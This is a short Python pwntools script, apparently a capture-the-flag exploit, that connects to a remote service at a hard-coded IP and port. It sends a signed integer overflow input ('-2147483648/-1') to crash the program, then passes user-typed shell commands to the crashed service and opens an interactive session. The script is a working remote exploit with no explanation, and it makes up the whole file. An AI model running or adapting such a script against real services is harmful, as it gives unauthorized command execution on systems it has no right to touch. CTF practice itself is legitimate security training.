#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *

context(log_level = 'debug')
while 1:
    shell = raw_input()
    p = remote('202.38.95.46', 12008)
    payload = '-2147483648/-1'
    p.sendline(payload)
    p.recvuntil('>>> Program crashed! You can run a program to examine:\n')
    p.send(shell)
    try:
        p.interactive()
        p.close()
    except:
        print 'Fail'
